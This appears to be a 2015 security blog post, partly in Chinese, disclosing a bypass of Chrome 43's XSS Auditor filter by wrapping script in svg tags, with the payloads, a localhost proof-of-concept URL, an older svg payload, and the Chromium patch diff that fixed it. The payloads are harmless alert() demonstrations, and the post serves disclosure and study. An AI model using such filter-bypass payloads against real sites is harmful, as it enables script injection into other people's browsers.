---
layout: post
title: Google Chrome Anti-XSS Filter Bypass
---

{{ page.title }}
================
<p class="date">{{ page.date | date_to_string }} - Tr3jer_CongRong</p>

#### First

众所周知Chrome浏览器的Xss Filter是基于模糊匹配敏感关键字的方式进行拦截外部JavaScript脚本注入的，然而可以通过svg标签绕过Xss Filter.

<img src="http://7xiw31.com1.z0.glb.clouddn.com/ysao8.png">

#### Details

	Affected Products:
	Google Chrome 43.0.2357.124 m (letest stable version)
	
	Discovery Date:
	16-06-15
	
	Payload:
	<svg><script>/<1/>alert()</script></svg>
	<svg><script>0<1>alert(document.domain)</script></svg>

#### POC

`OSX & Chrome 43.0.2357.65`

	http://127.0.0.1/demo.php?xss=<svg><script>/<1/>alert(document.domain)</script></svg>

<img src="http://7xiw31.com1.z0.glb.clouddn.com/4rywe7.png">

> 13年Gainover也分享过一个svg标签Bypass Chrome Xss Filter的Payload:`<svg><script xlink:href=data:,alert(1)></script></svg>`现已失效.

#### Patch

	Index: Source/core/html/parser/XSSAuditor.cppt a/Source/core/html/parser/XSSAuditor.cpp b/Source/core/html/parser/XSSAuditor.cpp
	index a1e1852201d23ac858c3b5065a2e26f52d128f4d..e73259145366c12c821a710fe83d3637529478ee 100644
	--- a/Source/core/html/parser/XSSAuditor.cpp
	+++ b/Source/core/html/parser/XSSAuditor.cpp
	@@ -471,15 +471,18 @@ bool XSSAuditor::filterCharacterToken(const FilterTokenRequest& request)
	if (m_state == PermittingAdjacentCharacterTokens)
	     return false;
 
	-    if ((m_state == SuppressingAdjacentCharacterTokens)
	-        || (m_scriptTagFoundInRequest && isContainedInRequest(canonicalizedSnippetForJavaScript(request)))) {
	+    if (m_state == FilteringTokens && m_scriptTagFoundInRequest) {
	+        String snippet = canonicalizedSnippetForJavaScript(request);
	+        if (isContainedInRequest(snippet))
	+            m_state = SuppressingAdjacentCharacterTokens;
	+        else if (!snippet.isEmpty())
	+            m_state = PermittingAdjacentCharacterTokens;
	+    }
	+    if (m_state == SuppressingAdjacentCharacterTokens) {
         request.token.eraseCharacters();
         request.token.appendToCharacter(' '); // Technically, character tokens can't be empty.
	-        m_state = SuppressingAdjacentCharacterTokens;
         return true;
     }
	-
	-    m_state = PermittingAdjacentCharacterTokens;
     return false;
	 }

#### Other

* <a target="_blank" href="http://vulnerable.info/browsers/bypassing-chromes-anti-xss-filter/">Bypassing Chrome’s Anti-XSS Filter</a>

* <a target="_blank" href="https://codereview.chromium.org/1187843005/">Issue 1187843005: XSSAuditor: Dont give a pass to subsequent script blocks if first one is empty. (Closed)</a>
